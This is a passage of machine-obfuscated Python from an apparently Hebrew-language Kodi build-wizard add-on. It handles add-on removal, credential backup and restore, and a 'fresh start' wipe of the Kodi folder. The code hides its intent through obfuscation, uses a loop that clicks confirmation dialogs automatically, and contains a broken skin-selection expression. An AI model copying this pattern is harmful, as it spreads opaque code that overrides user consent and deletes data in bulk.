	O000O0O0000OO0O00 =OO0000000O0OOO0O0 ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4589
	O000O0O0000OO0O00 .doModal ()#line:4590
	del O000O0O0000OO0O00 #line:4591
def removeAddon (O00000O0OOO000000 ,O000O00OO00OOOO00 ,over =False ):#line:4593
	if not over ==False :#line:4594
		OOO0OO00OO0000O0O =1 #line:4595
	else :#line:4596
		OOO0OO00OO0000O0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O000O00OO00OOOO00 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,O00000O0OOO000000 ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4597
	if OOO0OO00OO0000O0O ==1 :#line:4598
		O000O0O0O0OO0OOOO =os .path .join (ADDONS ,O00000O0OOO000000 )#line:4599
		wiz .log ("Removing Addon %s"%O00000O0OOO000000 )#line:4600
		wiz .cleanHouse (O000O0O0O0OO0OOOO )#line:4601
		xbmc .sleep (1000 )#line:4602
		try :shutil .rmtree (O000O0O0O0OO0OOOO )#line:4603
		except Exception as O0OOOOO00O000000O :wiz .log ("Error removing %s"%O00000O0OOO000000 ,xbmc .LOGNOTICE )#line:4604
		removeAddonData (O00000O0OOO000000 ,O000O00OO00OOOO00 ,over )#line:4605
	if over ==False :#line:4606
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O000O00OO00OOOO00 ))#line:4607
def removeAddonData (O0OO00O0OO000O0OO ,name =None ,over =False ):#line:4609
	if O0OO00O0OO000O0OO =='all':#line:4610
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4611
			wiz .cleanHouse (ADDOND )#line:4612
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4613
	elif O0OO00O0OO000O0OO =='uninstalled':#line:4614
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4615
			OO00O000O00000OO0 =0 #line:4616
			for O00O00O00OOOOOOOO in glob .glob (os .path .join (ADDOND ,'*')):#line:4617
				OO0000O0OOO0O00OO =O00O00O00OOOOOOOO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4618
				if OO0000O0OOO0O00OO in EXCLUDES :pass #line:4619
				elif os .path .exists (os .path .join (ADDONS ,OO0000O0OOO0O00OO )):pass #line:4620
				else :wiz .cleanHouse (O00O00O00OOOOOOOO );OO00O000O00000OO0 +=1 ;wiz .log (O00O00O00OOOOOOOO );shutil .rmtree (O00O00O00OOOOOOOO )#line:4621
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO00O000O00000OO0 ))#line:4622
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4623
	elif O0OO00O0OO000O0OO =='empty':#line:4624
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4625
			OO00O000O00000OO0 =wiz .emptyfolder (ADDOND )#line:4626
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO00O000O00000OO0 ))#line:4627
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4628
	else :#line:4629
		OO0OO0O0000O000O0 =os .path .join (USERDATA ,'addon_data',O0OO00O0OO000O0OO )#line:4630
		if O0OO00O0OO000O0OO in EXCLUDES :#line:4631
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4632
		elif os .path .exists (OO0OO0O0000O000O0 ):#line:4633
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,O0OO00O0OO000O0OO ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4634
				wiz .cleanHouse (OO0OO0O0000O000O0 )#line:4635
				try :#line:4636
					shutil .rmtree (OO0OO0O0000O000O0 )#line:4637
				except :#line:4638
					wiz .log ("Error deleting: %s"%OO0OO0O0000O000O0 )#line:4639
			else :#line:4640
				wiz .log ('Addon data for %s was not removed'%O0OO00O0OO000O0OO )#line:4641
	wiz .refresh ()#line:4642
def restoreit (OOOOO00OOOOOO000O ):#line:4644
	if OOOOO00OOOOOO000O =='build':#line:4645
		O0000O0OOO0O0OO00 =freshStart ('restore')#line:4646
		if O0000O0OOO0O0OO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4647
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4648
		wiz .skinToDefault ()#line:4649
	wiz .restoreLocal (OOOOO00OOOOOO000O )#line:4650
def restoreextit (O0OOOOOOO00000O0O ):#line:4652
	if O0OOOOOOO00000O0O =='build':#line:4653
		OO00O0OOO00OO0OOO =freshStart ('restore')#line:4654
		if OO00O0OOO00OO0OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4655
	wiz .restoreExternal (O0OOOOOOO00000O0O )#line:4656
def buildInfo (OOOOOO0O0O00O00OO ):#line:4658
	if wiz .workingURL (SPEEDFILE )==True :#line:4659
		if wiz .checkBuild (OOOOOO0O0O00O00OO ,'url'):#line:4660
			OOOOOO0O0O00O00OO ,O0OOOOO0OOOO0O0OO ,O00O0000OOO0OOO00 ,O00O000OO0OO0000O ,OOOOOO00O000000O0 ,O0OOO000O0O000OOO ,OO000OOOOO000000O ,O00O0O00OOO000O0O ,O0O0O000O00O0OO0O ,OO0O00O0000O000OO ,OOOO00O0O00OO00O0 =wiz .checkBuild (OOOOOO0O0O00O00OO ,'all')#line:4661
			OO0O00O0000O000OO ='Yes'if OO0O00O0000O000OO .lower ()=='yes'else 'No'#line:4662
			OOO0OO0O0O0OOO00O ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOOO0O0O00O00OO )#line:4663
			OOO0OO0O0O0OOO00O +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OOOOO0OOOO0O0OO )#line:4664
			if not O0OOO000O0O000OOO =="http://":#line:4665
				OOOO00OO0OOO0OOOO =wiz .themeCount (OOOOOO0O0O00O00OO ,False )#line:4666
				OOO0OO0O0O0OOO00O +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (OOOO00OO0OOO0OOOO ))#line:4667
			OOO0OO0O0O0OOO00O +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOOOO00O000000O0 )#line:4668
			OOO0OO0O0O0OOO00O +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OO0O00O0000O000OO )#line:4669
			OOO0OO0O0O0OOO00O +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOO00O0O00OO00O0 )#line:4670
			wiz .TextBox (ADDONTITLE ,OOO0OO0O0O0OOO00O )#line:4671
		else :wiz .log ("Invalid Build Name!")#line:4672
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4673
def buildVideo (O00O00O00OO0OO0O0 ):#line:4675
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4676
	if wiz .workingURL (SPEEDFILE )==True :#line:4677
		O0O0OOOO0O0O00000 =wiz .checkBuild (O00O00O00OO0OO0O0 ,'preview')#line:4678
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O00O00O00OO0OO0O0 )#line:4679
		if O0O0OOOO0O0O00000 and not O0O0OOOO0O0O00000 =='http://':playVideo (O0O0OOOO0O0O00000 )#line:4680
		else :wiz .log ("[%s]Unable to find url for video preview"%O00O00O00OO0OO0O0 )#line:4681
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4682
def dependsList (O0OOO00000000O0OO ):#line:4684
	O0OOO0OO0000O0OO0 =os .path .join (ADDONS ,O0OOO00000000O0OO ,'addon.xml')#line:4685
	if os .path .exists (O0OOO0OO0000O0OO0 ):#line:4686
		OO0O0OO00O00O00O0 =open (O0OOO0OO0000O0OO0 ,mode ='r');OOOOOO0OOO0OOO0O0 =OO0O0OO00O00O00O0 .read ();OO0O0OO00O00O00O0 .close ();#line:4687
		O0O0OO00O0O0O000O =wiz .parseDOM (OOOOOO0OOO0OOO0O0 ,'import',ret ='addon')#line:4688
		OOO00OO0000O00OO0 =[]#line:4689
		for O0000O00O000O0OO0 in O0O0OO00O0O0O000O :#line:4690
			if not 'xbmc.python'in O0000O00O000O0OO0 :#line:4691
				OOO00OO0000O00OO0 .append (O0000O00O000O0OO0 )#line:4692
		return OOO00OO0000O00OO0 #line:4693
	return []#line:4694
def manageSaveData (OOO0O00O00O0OOO00 ):#line:4696
	if OOO0O00O00O0OOO00 =='import':#line:4697
		O00OOO0OO0OO00OO0 =os .path .join (ADDONDATA ,'temp')#line:4698
		if not os .path .exists (O00OOO0OO0OO00OO0 ):os .makedirs (O00OOO0OO0OO00OO0 )#line:4699
		OO00OO000OO0OO0OO =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4700
		if not OO00OO000OO0OO0OO .endswith ('.zip'):#line:4701
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4702
			return #line:4703
		OOOO0OOO00O0O0O00 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4704
		OOOO000O00O0O0O00 =xbmcvfs .copy (OO00OO000OO0OO0OO ,OOOO0OOO00O0O0O00 )#line:4705
		wiz .log ("%s"%str (OOOO000O00O0O0O00 ))#line:4706
		extract .all (xbmc .translatePath (OOOO0OOO00O0O0O00 ),O00OOO0OO0OO00OO0 )#line:4707
		O000O000O0000O0OO =os .path .join (O00OOO0OO0OO00OO0 ,'trakt')#line:4708
		OOOO0OOO0O0OO00OO =os .path .join (O00OOO0OO0OO00OO0 ,'login')#line:4709
		OOO00OO00O0OO0O0O =os .path .join (O00OOO0OO0OO00OO0 ,'debrid')#line:4710
		OOO0O0O00OOO00OOO =0 #line:4711
		if os .path .exists (O000O000O0000O0OO ):#line:4712
			OOO0O0O00OOO00OOO +=1 #line:4713
			O00OOO00O00OO0000 =os .listdir (O000O000O0000O0OO )#line:4714
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4715
			for OO00O0O0O00OO0O0O in O00OOO00O00OO0000 :#line:4716
				O0000OO0O00OO0O00 =os .path .join (traktit .TRAKTFOLD ,OO00O0O0O00OO0O0O )#line:4717
				OO00O0O000O0OOOO0 =os .path .join (O000O000O0000O0OO ,OO00O0O0O00OO0O0O )#line:4718
				if os .path .exists (O0000OO0O00OO0O00 ):#line:4719
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00O0O0O00OO0O0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4720
					else :os .remove (O0000OO0O00OO0O00 )#line:4721
				shutil .copy (OO00O0O000O0OOOO0 ,O0000OO0O00OO0O00 )#line:4722
			traktit .importlist ('all')#line:4723
			traktit .traktIt ('restore','all')#line:4724
		if os .path .exists (OOOO0OOO0O0OO00OO ):#line:4725
			OOO0O0O00OOO00OOO +=1 #line:4726
			O00OOO00O00OO0000 =os .listdir (OOOO0OOO0O0OO00OO )#line:4727
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4728
			for OO00O0O0O00OO0O0O in O00OOO00O00OO0000 :#line:4729
				O0000OO0O00OO0O00 =os .path .join (loginit .LOGINFOLD ,OO00O0O0O00OO0O0O )#line:4730
				OO00O0O000O0OOOO0 =os .path .join (OOOO0OOO0O0OO00OO ,OO00O0O0O00OO0O0O )#line:4731
				if os .path .exists (O0000OO0O00OO0O00 ):#line:4732
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00O0O0O00OO0O0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4733
					else :os .remove (O0000OO0O00OO0O00 )#line:4734
				shutil .copy (OO00O0O000O0OOOO0 ,O0000OO0O00OO0O00 )#line:4735
			loginit .importlist ('all')#line:4736
			loginit .loginIt ('restore','all')#line:4737
		if os .path .exists (OOO00OO00O0OO0O0O ):#line:4738
			OOO0O0O00OOO00OOO +=1 #line:4739
			O00OOO00O00OO0000 =os .listdir (OOO00OO00O0OO0O0O )#line:4740
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4741
			for OO00O0O0O00OO0O0O in O00OOO00O00OO0000 :#line:4742
				O0000OO0O00OO0O00 =os .path .join (debridit .REALFOLD ,OO00O0O0O00OO0O0O )#line:4743
				OO00O0O000O0OOOO0 =os .path .join (OOO00OO00O0OO0O0O ,OO00O0O0O00OO0O0O )#line:4744
				if os .path .exists (O0000OO0O00OO0O00 ):#line:4745
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO00O0O0O00OO0O0O ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4746
					else :os .remove (O0000OO0O00OO0O00 )#line:4747
				shutil .copy (OO00O0O000O0OOOO0 ,O0000OO0O00OO0O00 )#line:4748
			debridit .importlist ('all')#line:4749
			debridit .debridIt ('restore','all')#line:4750
		wiz .cleanHouse (O00OOO0OO0OO00OO0 )#line:4751
		wiz .removeFolder (O00OOO0OO0OO00OO0 )#line:4752
		os .remove (OOOO0OOO00O0O0O00 )#line:4753
		if OOO0O0O00OOO00OOO ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4754
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4755
	elif OOO0O00O00O0OOO00 =='export':#line:4756
		O000O00O00O0OO00O =xbmc .translatePath (MYBUILDS )#line:4757
		O0O0O0OO0000000O0 =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4758
		traktit .traktIt ('update','all')#line:4759
		loginit .loginIt ('update','all')#line:4760
		debridit .debridIt ('update','all')#line:4761
		OO00OO000OO0OO0OO =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4762
		OO00OO000OO0OO0OO =xbmc .translatePath (OO00OO000OO0OO0OO )#line:4763
		O0OO000O0000OOOO0 =os .path .join (O000O00O00O0OO00O ,'SaveData.zip')#line:4764
		O0O000O0000O00O00 =zipfile .ZipFile (O0OO000O0000OOOO0 ,mode ='w')#line:4765
		for O0O0000OO0OO0OO00 in O0O0O0OO0000000O0 :#line:4766
			if os .path .exists (O0O0000OO0OO0OO00 ):#line:4767
				O00OOO00O00OO0000 =os .listdir (O0O0000OO0OO0OO00 )#line:4768
				for O0OOO0OO0OOO00000 in O00OOO00O00OO0000 :#line:4769
					O0O000O0000O00O00 .write (os .path .join (O0O0000OO0OO0OO00 ,O0OOO0OO0OOO00000 ),os .path .join (O0O0000OO0OO0OO00 ,O0OOO0OO0OOO00000 ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4770
		O0O000O0000O00O00 .close ()#line:4771
		if OO00OO000OO0OO0OO ==O000O00O00O0OO00O :#line:4772
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO000O0000OOOO0 ))#line:4773
		else :#line:4774
			try :#line:4775
				xbmcvfs .copy (O0OO000O0000OOOO0 ,os .path .join (OO00OO000OO0OO0OO ,'SaveData.zip'))#line:4776
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OO00OO000OO0OO0OO ,'SaveData.zip')))#line:4777
			except :#line:4778
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0OO000O0000OOOO0 ))#line:4779
def freshStart (install =None ,over =False ):#line:4784
	if USERNAME =='':#line:4785
		ADDON .openSettings ()#line:4786
		sys .exit ()#line:4787
	O000OOOO0OOOO000O =u_list (SPEEDFILE )#line:4788
	(O000OOOO0OOOO000O )#line:4789
	O0OOOO00OOOO0O0OO =(wiz .workingURL (O000OOOO0OOOO000O ))#line:4790
	(O0OOOO00OOOO0O0OO )#line:4791
	if KEEPTRAKT =='true':#line:4792
		traktit .autoUpdate ('all')#line:4793
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4794
	if KEEPREAL =='true':#line:4795
		debridit .autoUpdate ('all')#line:4796
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4797
	if KEEPLOGIN =='true':#line:4798
		loginit .autoUpdate ('all')#line:4799
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4800
	if over ==True :O000000OOO0000OOO =1 #line:4801
	elif install =='restore':O000000OOO0000OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4802
	elif install :O000000OOO0000OOO =1 #line:4803
	else :O000000OOO0000OOO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4804
	if O000000OOO0000OOO :#line:4805
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4806
			O00O00O0000O0O0O0 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4807
			skinSwitch .swapSkins (O00O00O0000O0O0O0 )#line:4810
			O00O00OOO000O00O0 =0 #line:4811
			xbmc .sleep (1000 )#line:4812
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00O00OOO000O00O0 <150 :#line:4813
				O00O00OOO000O00O0 +=1 #line:4814
				xbmc .sleep (1000 )#line:4815
				wiz .ebi ('SendAction(Select)')#line:4816
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4817
				wiz .ebi ('SendClick(11)')#line:4818
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4819
			xbmc .sleep (1000 )#line:4820
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4821
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4822
			return #line:4823
		wiz .addonUpdates ('set')#line:4824
		O0OOOO0OOOOOOO00O =os .path .abspath (HOME )#line:4825
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4826
		O0O0O0OOO0O000OOO =sum ([len (O0O0000OO00O0OO00 )for O00O0000O000OO0O0 ,O00O000OOOO0O0000 ,O0O0000OO00O0OO00 in os .walk (O0OOOO0OOOOOOO00O )]);O00O00O0O000OOOOO =0 #line:4827
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4828
		EXCLUDES .append ('My_Builds')#line:4829
		EXCLUDES .append ('archive_cache')#line:4830
		EXCLUDES .append ('script.module.requests')#line:4831
		EXCLUDES .append ('myfav.anon')#line:4832
		if KEEPREPOS =='true':#line:4833
			OO0OO0OOOO0O0OO00 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4834
			for O0000O0000O0O0000 in OO0OO0OOOO0O0OO00 :#line:4835
				O0OOOOO0O000OOO0O =os .path .split (O0000O0000O0O0000 [:-1 ])[1 ]#line:4836
				if not O0OOOOO0O000OOO0O ==EXCLUDES :#line:4837
					EXCLUDES .append (O0OOOOO0O000OOO0O )#line:4838
		if KEEPSUPER =='true':#line:4839
			EXCLUDES .append ('plugin.program.super.favourites')#line:4840
		if KEEPMOVIELIST =='true':#line:4841
			EXCLUDES .append ('plugin.video.metalliq')#line:4842
		if KEEPMOVIELIST =='true':#line:4843
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4844
		if KEEPADDONS =='true':#line:4845
			EXCLUDES .append ('addons')#line:4846
		if KEEPADDONS =='true':#line:4847
			EXCLUDES .append ('addon_data')#line:4848
		EXCLUDES .append ('plugin.video.elementum')#line:4851
		EXCLUDES .append ('script.elementum.burst')#line:4852
		EXCLUDES .append ('script.elementum.burst-master')#line:4853
		EXCLUDES .append ('plugin.video.quasar')#line:4854
		EXCLUDES .append ('script.quasar.burst')#line:4855
		EXCLUDES .append ('skin.estuary')#line:4856
		if KEEPWHITELIST =='true':#line:4859
			OO0O0O00O0OOO00O0 =''#line:4860
			O00OOO0OO0OOOO0OO =wiz .whiteList ('read')#line:4861
			if len (O00OOO0OO0OOOO0OO )>0 :#line:4862
				for O0000O0000O0O0000 in O00OOO0OO0OOOO0OO :#line:4863
					try :OOO0OO00OO0O0O0O0 ,O0OO000O000O0O000 ,OO0OO0OOO0O0OOO00 =O0000O0000O0O0000 #line:4864
					except :pass #line:4865
					if OO0OO0OOO0O0OOO00 .startswith ('pvr'):OO0O0O00O0OOO00O0 =O0OO000O000O0O000 #line:4866
					OO0OO000OOO00OO00 =dependsList (OO0OO0OOO0O0OOO00 )#line:4867
					for O0O0OO0000000O0O0 in OO0OO000OOO00OO00 :#line:4868
						if not O0O0OO0000000O0O0 in EXCLUDES :#line:4869
							EXCLUDES .append (O0O0OO0000000O0O0 )#line:4870
						O0OO0OOOO000OOOOO =dependsList (O0O0OO0000000O0O0 )#line:4871
						for O000000OO0OO0OO0O in O0OO0OOOO000OOOOO :#line:4872
							if not O000000OO0OO0OO0O in EXCLUDES :#line:4873
								EXCLUDES .append (O000000OO0OO0OO0O )#line:4874
					if not OO0OO0OOO0O0OOO00 in EXCLUDES :#line:4875
						EXCLUDES .append (OO0OO0OOO0O0OOO00 )#line:4876
				if not OO0O0O00O0OOO00O0 =='':wiz .setS ('pvrclient',OO0OO0OOO0O0OOO00 )#line:4877
		if wiz .getS ('pvrclient')=='':#line:4878
			for O0000O0000O0O0000 in EXCLUDES :#line:4879
				if O0000O0000O0O0000 .startswith ('pvr'):#line:4880
					wiz .setS ('pvrclient',O0000O0000O0O0000 )#line:4881
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4882
		O0OO0OO0O0OO00O00 =wiz .latestDB ('Addons')#line:4883
		for O0O00OO00O0O0OOOO ,OOOO0O0000O0O000O ,O0OOOOO0O000OO00O in os .walk (O0OOOO0OOOOOOO00O ,topdown =True ):#line:4884
			OOOO0O0000O0O000O [:]=[OO0O0O0O00000O0OO for OO0O0O0O00000O0OO in OOOO0O0000O0O000O if OO0O0O0O00000O0OO not in EXCLUDES ]#line:4885
			for OOO0OO00OO0O0O0O0 in O0OOOOO0O000OO00O :#line:4886
				O00O00O0O000OOOOO +=1 #line:4887
				OO0OO0OOO0O0OOO00 =O0O00OO00O0O0OOOO .replace ('/','\\').split ('\\')#line:4888
				O00O00OOO000O00O0 =len (OO0OO0OOO0O0OOO00 )-1 #line:4890
				if OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -2 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4891
				elif OOO0OO00OO0O0O0O0 =='MyVideos99.db'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4892
				elif OOO0OO00OO0O0O0O0 =='MyVideos107.db'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4893
				elif OOO0OO00OO0O0O0O0 =='MyVideos116.db'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4894
				elif OOO0OO00OO0O0O0O0 =='MyVideos99.db'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4895
				elif OOO0OO00OO0O0O0O0 =='MyVideos107.db'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -1 ]=='userdata'and OO0OO0OOO0O0OOO00 [O00O00OOO000O00O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0O00OO00O0O0OOOO ,OOO0OO00OO0O0O0O0 ),xbmc .LOGNOTICE )#line:4896
